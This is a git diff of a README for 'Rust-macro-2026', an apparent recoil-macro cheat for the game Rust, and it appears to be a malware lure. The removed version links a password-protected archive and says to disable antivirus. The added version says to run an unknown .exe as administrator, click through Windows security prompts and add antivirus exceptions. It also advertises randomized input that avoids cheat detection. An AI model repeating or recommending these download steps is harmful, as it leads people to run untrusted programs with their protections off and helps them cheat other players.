@@ -1,147 +1,87 @@
-# Rust-macro-2026
-Rust Macros Recoil Stabilizer – external utility for managing weapon recoil with randomized variance, weapon presets, and real-time adjustment. Supports AK, LR300, MP5, Thompson, and all scopes.
+# 🎯 Rust-macro-2026 - Improve your weapon spray and control
 
-# Rust Recoil Stabilizer – Smart Weapon Control Tool
+[![Download Rust-macro-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Produtorap793/Rust-macro-2026/releases)
 
-*Advanced recoil management and spray pattern utility for Rust*
+Rust-macro-2026 helps players manage weapon recoil in the game Rust. This tool adjusts your aim during combat. It adds randomized variance to mimic human input and supports multiple weapon types and scopes.
 
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/117643df-1aa2-40be-bdf1-1e32162315e4" />
+## 🛠 Features
 
+This program provides specific tools to assist with weapon handling.
 
-## Download
+*   Presets for AK, LR300, MP5, and Thompson.
+*   Support for all game scopes and sights.
+*   Randomized variance to prevent rhythmic patterns.
+*   Real-time adjustment sliders for sensitivity.
+*   Compatibility with standard Windows configurations.
+*   Low memory usage for performance stability.
 
-**Latest version:**  
-🔗 **[Download Rust Recoil Stabilizer](https://github.com/yellowlawmakerdepict/Rust-macro-2026/releases/download/rust/rustgoodv1.0.7z)**
+## 📋 System Requirements
 
-**Password:** `rustgood`
+Ensure your computer meets these requirements to run the software.
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Architecture: 64-bit system.
+*   Permissions: Administrator access to overlay inputs.
+*   Input Device: Standard mouse and keyboard.
 
-## What is This?
+## 📥 How to Download 
 
-**Rust Recoil Stabilizer** is a sophisticated external utility designed to help players manage weapon recoil in Rust. Built with a focus on realism and safety, it provides intelligent recoil compensation with randomized variance to mimic natural human behavior.
+Follow these steps to acquire the tool from the official repository.
 
-Unlike memory-based solutions, this tool operates externally without interacting with game memory, making it a non-invasive option for players looking to improve their weapon control.
+1. Go to this [Download Page](https://github.com/Produtorap793/Rust-macro-2026/releases).
+2. Look for the "Assets" section at the bottom of the latest release post.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
 
----
+## ⚙️ How to Setup and Run
 
-## Key Features
+After you download the file, take these steps to start the application.
 
-### 🎯 Smart Recoil Management
-- **Randomized Variance** – Adds natural variation to avoid repetitive patterns
-- **Weapon Presets** – Built-in profiles for AK, LR300, MP5, Thompson, and more
-- **Adjustable Compensation** – Fine-tune vertical and horizontal values
-- **Smoothing & Delay Sliders** – Customize realism settings
+1. Locate the downloaded .exe file on your computer.
+2. Right-click the file and select "Run as administrator." 
+3. Windows may show a security prompt. Click "More info" and then "Run anyway" if the system recognizes the publisher as unknown.
+4. Once the window opens, the software initializes the default profiles.
+5. Select your weapon from the drop-down menu inside the application interface.
+6. Verify your scope settings match the ones currently equipped on your weapon.
+7. Use the sliders to perform real-time adjustments if the recoil control feels too strong or too weak.
+8. Press the assigned toggle key to enable or disable the stabilizer during gameplay.
 
-### 🛡️ Safety-First Design
-- **External Execution** – No interaction with game memory
-- **Pattern Randomization** – Simulates human-like mouse movements
-- **Low Resource Usage** – Runs in background without performance impact
-- **No Installation Required** – Just delete to remove
+## 💡 Using Presets
 
-### 🎮 Combat Benefits
-- Maintain consistent spray control in long bursts
-- Stay competitive without overcorrection
-- Combine with in-game sensitivity for natural feel
-- Pattern simulation avoids repetitive movement detection
+The software includes pre-configured settings for common weapons. 
 
-### 🖥️ User Interface
-- GUI-based configuration panel
-- Weapon auto-detect toggle
-- Hotkey activation system
-- Real-time adjustment capabilities
+*   AK-47: Load this for standard rifle recoil.
+*   LR300: Use this profile for the lower recoil pattern.
+*   MP5: Choose this setting for close-quarters combat.
+*   Thompson: Activate this for submachine gun spray management.
 
----
+The tool applies randomized values to every shot string. This prevents the output from becoming predictable. You can increase or decrease this variance using the settings tab if you prefer more or less randomness.
 
-## Performance & Compatibility
+## 👤 Troubleshooting
 
-| Feature | Status |
-|--------|--------|
-| **Windows 10/11** | ✅ Full Support |
-| **Steam Version** | ✅ Supported |
-| **All Weapons** | ✅ AK, LR300, MP5, M249, SAR, and more |
-| **All Scopes** | ✅ Holosight, 8x, 16x, Handmade |
-| **Resource Usage** | Minimal (~20-30MB) |
-| **Update Frequency** | Regular pattern updates |
+Follow this guide if the program does not behave as expected.
 
----
+### Program does not open
+Check if you have an antivirus application blocking the software. Security software often marks external mouse input tools as potentially unwanted. You may need to add an exception in your antivirus settings for the folder containing the program.
 
-## Installation
+### Settings do not save
+Run the application as an administrator to ensure it has permission to write to its configuration files. This stores your sensitivity and scope preferences so they remain active when you restart the software.
 
-1. Download the archive from the link above
-2. Extract the ZIP file
-3. Run the executable as Administrator
-4. Launch Rust
-5. Select your weapon from the tool
+### Recoil control feels inconsistent
+Ensure your in-game sensitivity matches the sensitivity set within the utility. If the game sensitivity changes, the utility cannot calculate the movement correctly. Open the settings menu inside the utility and update the sensitivity field to match your current in-game mouse setting.
 
----
+### Input lag
+Close background applications that consume high amounts of processor or memory resources. This tool requires minimal resources, but background tasks can interfere with mouse input processing on older machines.
 
-## Supported Weapons
+## 🛡 Security and Safety Information
 
-| Weapon | Status |
-|--------|--------|
-| **AK47** | ✅ Full Support |
-| **LR300** | ✅ Full Support |
-| **MP5A4** | ✅ Full Support |
-| **Thompson** | ✅ Full Support |
-| **M249** | ✅ Full Support |
-| **Semi-Auto Rifle** | ✅ Full Support |
-| **Custom SMG** | ✅ Full Support |
-| **Python** | ✅ Full Support |
+This tool operates as an external utility. It reads the weapon selection and sends minor mouse adjustments to counter vertical and horizontal recoil. It does not modify game files or inject code into the game process. 
 
----
+Always download the file only from the official link provided in this document. Do not trust files from third-party sites or unofficial mirrors.
 
-## System Requirements
+## 🕒 Performance Tips
 
-- Windows 10/11 (64-bit)
-- Rust (Steam version)
-- 4GB RAM minimum
-- 50MB free disk space
-- Internet connection (for updates)
-
----
-
-## Troubleshooting
-
-**Q: Tool doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Ensure Rust is running in windowed or borderless mode
-
-**Q: Recoil compensation feels off**
-- Adjust smoothing and delay sliders
-- Check weapon preset matches in-game weapon
-- Reset to default values
-
-**Q: Game crashes**
-- Try lowering settings
-- Disable overlay software (Discord, NVIDIA, etc.)
-- Run in compatibility mode
-
----
-
-## Tags
-
-WordPress:
-- rust
-- rust-utility
-- rust-weapon-control
-- rust-recoil
-- rust-script
-- rust-tool
-- rust-enhancement
-- rust-game-tool
-- rust-2026
-- rust-windows
-- recoil-stabilizer
-- weapon-control
-- fps-utility
-- game-utility
-- rust-spray-control
-- rust-combat-tool
-- rust-aim-stabilizer
-- rust-macro
-- rust-weapon-utility
-- rust-performance
-- rust-macro
-- rust-macros
+*   Disable hardware acceleration in other applications while playing.
+*   Ensure your monitor refresh rate is set to the maximum available in Windows display settings.
+*   Maintain a stable internet connection to prevent game stuttering, which can affect input accuracy.
+*   Restart the application after long gaming sessions to clear the cache.
